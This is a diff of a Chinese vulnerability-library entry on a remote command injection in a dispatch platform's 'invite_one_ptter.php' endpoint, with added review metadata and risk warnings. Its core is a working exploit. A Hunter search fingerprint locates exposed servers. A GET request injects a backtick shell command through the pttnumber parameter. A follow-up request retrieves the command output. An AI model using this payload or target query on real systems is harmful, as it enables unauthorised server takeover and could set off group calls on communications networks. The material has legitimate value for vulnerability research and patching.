@@ -1,20 +1,60 @@
 ---
-fofa: "</font>"
 source: "wy876 漏洞文库"
+title: "指挥调度平台PHP版（科立讯归属待核） ptt invite_one_ptter pttnumber命令注入"
+product: "指挥调度平台PHP版（科立讯归属待核）"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "未知版本，Unix shell且目录可写"
+prerequisites: "请求带PHP会话"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/letplgg87ootvc4x"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0invite_one_ptter%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
+fofa_unverified: "</font>"
+hunter: "web.body=\"app/structure/departments.php\""
+id: "vw-4e32308a1c8df3d4d906964b"
+entity_id: "ve-4e32308a1c8df3d4d906964b"
+schema_version: "1"
 ---
 
-# 指挥调度平台invite_one_ptter存在远程命令执行漏洞
+# 指挥调度平台PHP版（科立讯归属待核） ptt invite_one_ptter pttnumber命令注入
 
-# 一、漏洞简介
-<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台invite_one_ptter存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。</font>
+## 条目说明
 
-# <font style="color:rgb(51, 51, 51);">三、资产测绘</font>
-+ <font style="color:rgb(51, 51, 51);">hunter</font>`<font style="color:rgb(51, 51, 51);">web.body="app/structure/departments.php"</font>`
-+ <font style="color:rgb(51, 51, 51);">特征</font>
+- 对象与具体问题：指挥调度平台PHP版（科立讯归属待核）；ptt invite_one_ptter pttnumber命令注入
+- 版本、配置及部署条件：未知版本，Unix shell且目录可写
+- 认证与权限前提：请求带PHP会话
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- callee=all和force可能触发群呼业务，除落盘外有通讯副作用必须标记
+- 无响应、清理、根因和修复；影响版本节缺失，HTML污染FOFA
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 一、漏洞简介
+指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台invite_one_ptter存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。
+
+## 三、资产测绘
++ hunter`web.body="app/structure/departments.php"`
++ 特征
 
 
-# <font style="color:rgb(51, 51, 51);">四、漏洞复现</font>
-```plain
+## 四、漏洞复现
+```http
 GET /api/client/ptt/invite_one_ptter.php?callee=all&caller=1&pttnumber=`id>1.txt`&force=1&timeout=1 HTTP/1.1
 Host: {hostname}
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
@@ -22,14 +62,14 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
+Cookie: PHPSESSID=9******************************2
 Upgrade-Insecure-Requests: 1
 ```
 
 
 获取命令执行结果
 
-```plain
+```http
 GET /api/client/ptt/1.txt HTTP/1.1
 Host: {hostname}
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
@@ -37,7 +77,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
+Cookie: PHPSESSID=9******************************2
 Upgrade-Insecure-Requests: 1
 ```
 
